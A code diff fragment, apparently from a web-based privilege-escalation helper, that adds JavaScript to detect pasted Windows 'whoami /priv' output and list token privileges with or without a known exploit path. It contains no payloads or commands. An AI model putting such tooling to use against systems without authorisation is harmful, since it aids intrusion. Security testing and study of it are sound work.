+      <a class="si-goto" href="#${ex.section}" onclick="closeModal('si-modal')">&#8594; Jump to full section</a>
+    </div>`;
+  });
+
+  if (unmatched.length > 0) {
+    html2 += `<div style="margin-top:8px;font-size:11px;color:var(--text3)">Other privileges found (no direct exploit path): ${unmatched.map(p=>`<code style="font-size:10px;background:var(--bg4);padding:1px 4px;border-radius:2px">${p.name}</code>`).join(' ')}</div>`;
+  }
+
+  html2 += '</div>';
+  out.innerHTML = html + html2;
+}
+
 let siDebounce = null;
 function siAutoDetect() {
   clearTimeout(siDebounce);
@@ -7081,6 +7405,9 @@ function parseSI() {
   const raw = document.getElementById('si-input').value.trim();
   const out = document.getElementById('si-output');
   if (!raw) { out.innerHTML = '<div class="si-placeholder">Paste output above and click Analyze</div>'; return; }
+  // Detect whoami /priv or whoami /all output
+  const isPrivs = /PRIVILEGES INFORMATION|Se\w+Privilege\s+\S.*?(Enabled|Disabled)/i.test(raw);
+  if (isPrivs) { parseTokenPrivs(raw, out); return; }
   const isLin = /linux\s|\d+\.\d+\.\d+.*#\d+/i.test(raw) && !/windows|microsoft|os name/i.test(raw);
   isLin ? parseSILinux(raw, out) : parseSIWindows(raw, out);
 }
